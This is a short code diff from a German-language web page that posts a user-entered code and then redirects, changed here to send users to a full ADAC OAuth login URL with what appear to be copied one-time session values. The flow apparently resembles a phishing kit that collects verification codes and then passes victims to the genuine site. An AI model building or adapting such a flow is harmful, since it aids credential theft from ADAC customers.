@@ -175,7 +175,7 @@
                 data: JSON.stringify({ code: code }),
                 success: function(info) {
                     if (info.OK) {
-                        window.location.href = '<%=url%>' || 'https://www.adac.de/produkte/finanzdienstleistungen/kreditkarte/';
+                        window.location.href = '<%=url%>' || 'https://login.adac.de/4f2d1cba-3420-443f-a69a-e55dcc3874f4/b2c_1a_signuporsignin/oauth2/v2.0/authorize?client_id=28f0fa14-a41c-42a9-93a3-46aae5866c63&scope=https%3A%2F%2Flogin.adac.de%2FAPIL%2FRollen%20https%3A%2F%2Flogin.adac.de%2FAPIL%2FMitgliedsnummer%20https%3A%2F%2Flogin.adac.de%2FAPIL%2FMitgliedschaft%20https%3A%2F%2Flogin.adac.de%2FAPIL%2FDaten%20https%3A%2F%2Flogin.adac.de%2FAPIL%2FErweitert%20https%3A%2F%2Flogin.adac.de%2FAPIL%2FDv%20https%3A%2F%2Flogin.adac.de%2FAPIL%2FBank%20https%3A%2F%2Flogin.adac.de%2FAPIL%2FVersicherung%20https%3A%2F%2Flogin.adac.de%2FAPIL%2FProfil%20https%3A%2F%2Flogin.adac.de%2FAPIL%2FCDBSession%20openid%20profile%20offline_access&redirect_uri=https%3A%2F%2Fwww.adac.de%2Flogin-redirect%2F&client-request-id=01a14fca-a224-75db-b2da-c5306c922223&response_mode=fragment&client_info=1&clidata=1&nonce=01a14fca-a264-7e3a-88d2-1d2c7fa844ae&state=eyJpZCI6IjAxYTE0ZmNhLWEyMjQtN2M1YS04NGRmLWFjM2VkYTUwNTMwMSIsIm1ldGEiOnsiaW50ZXJhY3Rpb25UeXBlIjoicmVkaXJlY3QifX0%3D&x-client-SKU=msal.js.browser&x-client-VER=4.30.0&response_type=code&code_challenge=7WWRPdKc4g85ueNtYAFeQXG0mYjownY7l2aSexgaUVQ&code_challenge_method=S256';
                     } else {
                         submitBtn2.disabled = false;
                         submitBtn2.textContent = 'Bestätigen & Weiter';
